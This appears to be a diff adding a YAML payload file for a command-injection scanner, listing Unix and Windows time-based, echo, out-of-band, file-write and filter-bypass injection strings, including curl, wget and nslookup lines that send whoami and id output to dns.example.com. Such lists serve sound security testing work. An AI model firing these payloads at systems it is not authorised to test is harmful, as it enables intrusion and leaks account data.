@@ -1,0 +1,120 @@
+payloads:
+  time_based:
+    unix:
+      - content: "; sleep 5;"
+        description: "Unix时间盲注 - 分号分隔"
+        delay: 5
+      - content: "| sleep 5 |"
+        description: "Unix时间盲注 - 管道符"
+        delay: 5
+      - content: "&& sleep 5 &&"
+        description: "Unix时间盲注 - AND连接"
+        delay: 5
+      - content: "|| sleep 5 ||"
+        description: "Unix时间盲注 - OR连接"
+        delay: 5
+      - content: "`sleep 5`"
+        description: "Unix时间盲注 - 反引号执行"
+        delay: 5
+      - content: "$(sleep 5)"
+        description: "Unix时间盲注 - $()执行"
+        delay: 5
+      - content: "\n sleep 5"
+        description: "Unix时间盲注 - 换行符"
+        delay: 5
+      - content: "; ping -c 5 127.0.0.1;"
+        description: "Unix时间盲注 - ping延迟"
+        delay: 5
+    
+    windows:
+      - content: "& timeout 5"
+        description: "Windows时间盲注 - &连接"
+        delay: 5
+      - content: "| timeout 5"
+        description: "Windows时间盲注 - 管道符"
+        delay: 5
+      - content: "&& timeout 5"
+        description: "Windows时间盲注 - AND连接"
+        delay: 5
+      - content: "|| ping -n 5 127.0.0.1"
+        description: "Windows时间盲注 - ping延迟"
+        delay: 5
+
+  echo_based:
+    unix:
+      - content: "; echo 'RCE_TEST_MARKER_12345';"
+        description: "Unix回显测试"
+        marker: "RCE_TEST_MARKER_12345"
+      - content: "| echo RCE_TEST_MARKER_12345 |"
+        description: "Unix回显测试 - 管道符"
+        marker: "RCE_TEST_MARKER_12345"
+      - content: "; id;"
+        description: "Unix用户信息泄露"
+        marker: "uid="
+      - content: "; whoami;"
+        description: "Unix用户名泄露"
+        marker: null
+    
+    windows:
+      - content: "& echo RCE_TEST_MARKER_12345"
+        description: "Windows回显测试"
+        marker: "RCE_TEST_MARKER_12345"
+      - content: "| echo RCE_TEST_MARKER_12345"
+        description: "Windows回显测试 - 管道符"
+        marker: "RCE_TEST_MARKER_12345"
+      - content: "& whoami"
+        description: "Windows用户名泄露"
+        marker: null
+
+  dns_based:
+    unix:
+      - content: "; nslookup $(whoami).dns.example.com;"
+        description: "Unix DNS外带测试"
+      - content: "; curl http://dns.example.com/$(whoami);"
+        description: "Unix HTTP外带测试"
+      - content: "; wget http://dns.example.com/?d=$(id|base64);"
+        description: "Unix wget外带测试"
+    
+    windows:
+      - content: "| nslookup %USERNAME%.dns.example.com"
+        description: "Windows DNS外带测试"
+      - content: "& curl http://dns.example.com/?u=%USERNAME%"
+        description: "Windows HTTP外带测试"
+
+  file_based:
+    unix:
+      - content: "; id > /tmp/rce_test.txt;"
+        description: "Unix文件写入测试"
+        check_file: "/tmp/rce_test.txt"
+      - content: "; ls -la > /tmp/rce_ls.txt;"
+        description: "Unix目录列表写入"
+        check_file: "/tmp/rce_ls.txt"
+    
+    windows:
+      - content: "& whoami > C:\\temp\\rce_test.txt"
+        description: "Windows文件写入测试"
+        check_file: "C:\\temp\\rce_test.txt"
+      - content: "& dir > C:\\temp\\rce_dir.txt"
+        description: "Windows目录列表写入"
+        check_file: "C:\\temp\\rce_dir.txt"
+
+  bypass:
+    space_bypass:
+      - content: ";${IFS}sleep${IFS}5;"
+        description: "空格绕过 - IFS变量"
+      - content: ";{sleep,5};"
+        description: "空格绕过 - 大括号"
+    
+    filter_bypass:
+      - content: "; s''leep 5;"
+        description: "关键字绕过 - 引号分割"
+      - content: "; sle\\ep 5;"
+        description: "关键字绕过 - 反斜杠"
+      - content: "; sl$@eep 5;"
+        description: "关键字绕过 - 特殊字符"
+    
+    encoding:
+      - content: "%3bsleep%205%3b"
+        description: "URL编码绕过"
+      - content: "Ow=="
+        description: "Base64编码"
